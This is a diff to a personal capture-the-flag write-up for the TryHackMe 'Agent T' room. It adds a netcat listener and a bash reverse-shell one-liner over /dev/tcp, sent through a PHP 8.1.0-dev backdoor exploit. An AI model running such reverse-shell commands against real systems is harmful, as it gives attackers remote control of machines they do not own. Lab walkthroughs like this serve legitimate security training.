@@ -1,7 +1,7 @@
 # [Agent T](https://tryhackme.com/room/agentt)
 
 ```
-export IP=10.10.97.116
+export IP=10.10.216.139
 ```
 
 ---
@@ -49,3 +49,14 @@ export IP=10.10.97.116
 	```
 
 	k. This didn't work and I ended up trying a whole lot of other reverse shells, but none of them worked :(
+
+	l. HEYYOOO, me again. So watched a John Hammond video and tried the following commands and was able to secure a reverse shell.
+
+	```
+	# Setup local:
+	nc -lnvp 9999
+	# Send reverse shell command to `php_8.1.0-dev_exploit.py` backdoor (copy as is):
+	bash -c 'sh -i >& /dev/tcp/10.6.53.245/9999 0>&1'
+	```
+
+	m. Now, because no version of Python was installed on the target machine, I couldn't stabalize my reverse shell very easily. I read online that if I wanted to, I could install a static version of python on the machine, but I didn't want to go through that effort.
